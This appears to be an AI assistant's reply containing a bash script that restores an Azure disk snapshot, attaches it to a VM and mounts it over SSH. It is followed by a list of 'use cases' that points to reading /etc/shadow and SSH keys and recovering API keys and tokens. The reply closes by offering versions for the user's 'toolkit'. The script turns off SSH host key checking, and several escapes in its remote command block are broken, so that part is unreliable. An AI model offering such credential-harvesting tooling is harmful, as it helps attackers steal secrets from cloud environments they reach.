\#!/bin/bash

\# Usage: ./restore_and_mount.sh \<RESOURCE_GROUP\> \<SNAPSHOT_NAME\>
\<TARGET_VM\> \<MOUNT_PATH\>

RESOURCE_GROUP=\$1

SNAPSHOT_NAME=\$2

TARGET_VM=\$3

MOUNT_PATH=\${4:-/mnt/restore}

DISK_NAME="restoredDisk-\$(date +%s)"

echo "\[\*\] Creating disk from snapshot..."

az disk create \\

--resource-group "\$RESOURCE_GROUP" \\

--name "\$DISK_NAME" \\

--source "\$SNAPSHOT_NAME" \\

--query "id" -o tsv

echo "\[\*\] Attaching disk to VM: \$TARGET_VM..."

az vm disk attach \\

--resource-group "\$RESOURCE_GROUP" \\

--vm-name "\$TARGET_VM" \\

--name "\$DISK_NAME"

echo "\[\*\] Waiting 20s for the disk to initialize..."

sleep 20

echo "\[\*\] SSH into VM to mount disk..."

PUBLIC_IP=\$(az vm show -d -g "\$RESOURCE_GROUP" -n "\$TARGET_VM"
--query publicIps -o tsv)

SSH_USER=\$(az vm show -g "\$RESOURCE_GROUP" -n "\$TARGET_VM" --query
'osProfile.linuxConfiguration.adminUsername' -o tsv)

\# SSH Commands to identify and mount

SSH_CMDS=\$(cat \<\<EOF

set -e

echo "\[\*\] Listing available devices..."

lsblk

DEVICE=\\(lsblk -o NAME,MOUNTPOINT \| grep -vE "boot\|/" \| grep -E
'^sd\|^xvd' \| awk '{print "/dev/" \\1}' \| tail -n 1)

echo "\[\*\] Found device: \\DEVICE"

echo "\[\*\] Creating mount point: \$MOUNT_PATH"

sudo mkdir -p "\$MOUNT_PATH"

echo "\[\*\] Mounting \\DEVICE to \$MOUNT_PATH"

sudo mount \\DEVICE "\$MOUNT_PATH" \|\| echo "\[!\] Mount failed — maybe
no partition table?"

echo "\[\*\] Mounted volume:"

df -h "\$MOUNT_PATH"

ls -lah "\$MOUNT_PATH"

EOF

)

ssh -o StrictHostKeyChecking=no "\$SSH_USER@\$PUBLIC_IP" "\$SSH_CMDS"

------------------------------------------------------------------------

**🧪 Usage Example**

chmod +x restore_and_mount.sh

./restore_and_mount.sh myResourceGroup snap-01 myLinuxVM /mnt/snapshot

------------------------------------------------------------------------

**🔐 Post-Mount Use Cases**

- Browse /mnt/snapshot/etc/shadow or /mnt/snapshot/home/azureuser/.ssh/

- Recover configuration, API keys, tokens

- Look for sensitive app data in /var/www/, /opt/, or /srv/

------------------------------------------------------------------------

Would you like the same capability written in PowerShell or Python for
integration into your toolkit?
